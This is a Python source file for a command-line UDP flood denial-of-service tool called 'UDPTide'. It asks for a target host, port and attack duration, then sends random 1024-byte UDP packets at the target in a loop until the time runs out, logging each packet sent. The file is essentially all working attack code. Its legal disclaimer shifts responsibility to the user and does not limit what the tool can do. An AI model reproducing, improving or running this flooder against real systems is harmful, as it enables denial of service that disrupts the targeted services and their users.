#!/usr/bin/env python

import time
import socket
import random
import sys
import os

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    Orange='\033[33m'
    lightblue='\033[94m'
    lightcyan='\033[96m'
    BLUE = '\033[94m'
    Black = '\033[30m'
    GREEN = '\033[92m'
    pink='\033[95m'
    lightgreen='\033[92m'
    lightred='\033[91m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


def screen_clear():
    if os.name == 'posix': #for linux,unix,mac
      _ = os.system('clear')
    else:   #windows
     _ = os.system('cls')

def logo():
    print(color.YELLOW + """
$$\   $$\ $$$$$$$\  $$$$$$$\ $$$$$$$$\ $$\       $$\
$$ |  $$ |$$  __$$\ $$  __$$\\__$$  __|\__|      $$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |   $$\  $$$$$$$ | $$$$$$\
$$ |  $$ |$$ |  $$ |$$$$$$$  |  $$ |   $$ |$$  __$$ |$$  __$$\
$$ |  $$ |$$ |  $$ |$$  ____/   $$ |   $$ |$$ /  $$ |$$$$$$$$ |
$$ |  $$ |$$ |  $$ |$$ |        $$ |   $$ |$$ |  $$ |$$   ____|
\$$$$$$  |$$$$$$$  |$$ |        $$ |   $$ |\$$$$$$$ |\$$$$$$$\
 \______/ \_______/ \__|        \__|   \__| \_______| \_______|
          """ + color.END)
    print("")
    print("Description : A UDP Tide or UDP flood is a form of volumetric Denial-of-Service (DoS) attack where the attacker targets and overwhelms random ports on the host with IP packets containing User Datagram Protocol (UDP) packets. In this type of attack, the host looks for applications associated with these datagrams.")
    print("")
current_time = str([time.asctime()]) #gives day,date,time,year

try:
    screen_clear()
    logo()
    print(color.RED + "========================================================================")
    print(color.GREEN +"\nLEGAL DISCLAIMER: This Tool contains materials that can be potentially damaging or dangerous.It is the end users responsibility to obey all applicable local, state and federal laws.Developers assume no liability and are not responsible for any misuse or damage caused by this program.\n")
    print(color.RED+ "========================================================================" )

    victim = input(color.lightblue + color.BOLD  + "Target : " +color.pink + color.END)
    target = socket.gethostbyname(victim)
    port = input(color.lightblue + color.BOLD + "Open Port : " + color.pink + color.END )
    port = int(port)
    duration = input(color.lightblue + color.BOLD + "For How Many Second You Want to Attack : " + color.pink + color.END)
    duration = int(duration)
    screen_clear()

except KeyboardInterrupt as c :
        print("\n")
        print("KeyboardInterrupt")
        print(color.BLUE + "*"*50)
        print(color.RED + "Oops You Cloesd The Program.....!!!")
        sys.exit()
except PermissionError as permit :
        print("")
        print(permit)
        print("")
        print(color.pink + "*"*50)
        print(color.BOLD + color.RED + "ERROR ==> Re-Run Script with sudo" + color.END)
        print(color.pink + "*"*50)
        print("")
        sys.exit()
except socket.gaierror as gaierror:
        print("")
        print(color.BLUE + color.BOLD + "Error ==> Socket.gaierror" + color.END)
        print(gaierror)
        print("")
        print(color.pink +"*"*50)
        print(color.RED +"It seems invalid target is entered ")
        print("")
        sys.exit()
def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        timeout = time.time() + duration
        sent = 0

        while 1:
            if time.time() > timeout:
                break
            else:
                pass
            s.sendto(bytes, (target,port))
            sent = sent + 1
            print(current_time + color.RED +" Attacking" + color.YELLOW + " send : {0} packets".format(sent) + color.GREEN + " Target : {0}".format(target) + color.lightcyan +" Port : {0}".format(port) + color.END)

    except PermissionError as permit :
        print("")
        print(permit)
        print("")
        print(color.pink + "*"*50)
        print(color.RED + color.BOLD + "ERROR ==> Re-Run Script with sudo" + color.END)
        print(color.pink + "*"*50)
        print("")
        sys.exit()

    except socket.gaierror as gaierror:
        print("")
        print(color.BLUE + color.BOLD + "Error ==> Socket.gaierror" + color.END)
        print(gaierror)
        print("")
        print(color.pink +"*"*50)
        print(color.RED +"It seems invalid target is entered ")
        print("")
        sys.exit()

    except socket.timeout as timeout :
        print(timeout)
        print(color.BLUE + "\n Server TimeOut...!!!" + color.END)
        sys.exit()

    except socket.error as error:
        print(error)
        print(color.BLUE + "\n Server Not Responding...!!!" + color.END)
        sys.exit()

    except KeyboardInterrupt as c :
        print("\n")
        print("KeyboardInterrupt")
        print(color.BLUE + "*"*50)
        print(color.RED + "Oops You Cloesd The Program.....!!!")
        sys.exit()

attack()

